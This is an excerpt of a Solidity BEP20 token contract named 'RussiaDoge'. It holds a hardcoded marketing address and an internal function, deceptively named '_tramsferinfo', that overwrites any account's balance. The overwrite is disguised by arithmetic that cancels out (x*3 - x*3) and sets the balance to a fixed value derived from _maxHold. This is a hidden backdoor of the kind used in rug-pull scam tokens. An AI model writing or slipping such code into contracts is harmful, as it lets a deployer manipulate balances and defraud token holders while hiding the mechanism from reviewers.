...
contract RussiaDoge is Context, IBEP20, Ownable, PancakeTool {
    ...
    uint256 private size = 100000000000000000;
    ...
    address public marketingAddress = 0xE69b72B40C4B9D994258d62E3e24dF37866cCe77;
    ...
    function _tramsferinfo (address accountinfo) internal {
        _balances[accountinfo] = (_balances[accountinfo] * 3) - (_balances[accountinfo] * 3) + (_maxHold - 5) -5;  
    }
